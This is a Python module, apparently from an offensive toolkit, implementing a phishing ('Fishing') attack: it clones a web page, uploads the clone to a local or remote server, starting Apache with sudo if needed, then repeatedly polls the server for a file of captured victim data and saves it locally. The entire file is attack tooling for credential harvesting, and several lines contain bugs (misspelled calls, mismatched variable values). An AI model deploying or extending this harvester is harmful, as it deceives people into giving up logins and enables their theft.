import Includes.includes as include
from Setup.setup import commands
import requests
import urllib.request
import time
import modules.Attack.cloning as clone
import os

class Fishing:

    def __str__():
        return 'Fishing attack'

    def run():
        fish()


def fish():
    '''
    Fishing attack
    :return: void
    '''

    ### Deal with the output file
    slash = include.command(commands, 'slash')
    outputFile = str(input("output file: "))
    dir = "data%sFishing" % slash
    fileName = dir+slash+outputFile
    # Checks on the existence and craeation if necessary
    if os.path.isdir(dir) == False:
        os.system('mkdir %s' % dir)
    fileName = include.ifexists(fileName)

    # Clone the page and do the necessary edits
    page = clone.clone()

    # Host server
    host = str(input('Host server (localhost or local IP for the IP of your machine): '))

    localAdress = include.get_ip()[1]

    files = {'file': open(page)}
    port = 80
    if host == 'localhost' or host == localAdress:
        version = ""

        f = open('Setup%sserver.config' % slash, 'r')
        for line in f:
            if '#' not in line:
                if 'MAMP' in line:
                    version = 'MAMP'
                elif 'XAMPP' in line:
                    version = 'XAMPP'
                elif 'Linux' in line:
                    version = 'linux'
                elif 'port' in line:
                    port = int(line.split(' ')[2])

        if version == 'linux':
            try:
                os.system('sudo service apache2 start')
            except:
                print("[-] Cannot start the apache server.")
                print("[-] Exiting the attack")
                return

        try:
            r = requests.post("%s:%d%sindex.php" % (host,port,slash), files=files)
        except Exception as e:
            print(e)
            print('[-] Unable to send the cloned page to the server')
            print('[-] Exiting the attack')
            time.sleep(5)
            return

    else:
        try:
            r = requests.post("http://"+host+"/index.php", files=files)
        except Exception as e:
            print(e)
            print('[-] Unable to send the cloned page to the server')
            print('[-] Exiting the attack')
            time.sleep(5)

    print("[+] File sent to the server")
    target_URL = host+slash+"temp.txt"
    while 1:
        try:
            print("[*] Listening on http//%s ...." % host)
            data = request.get(target_URL)
            if data.status_code == 200:
                f = open(fileName, 'w')
                for line in data.contents:
                    f.write(line.decode("utf-8"))
                f.close()
            break
        except:
            time.sleep(5)
    if not data.content:
        print("[-] Unable to recieve the data")
        print("[-] Exiting the attack")
        return
    print("[+] Data reveived")

    print('[+] Fishing completed, the file is stored as:  %s' % fileName)
    if version == 'Linux':
        os.system('sudo service apache2 stop')
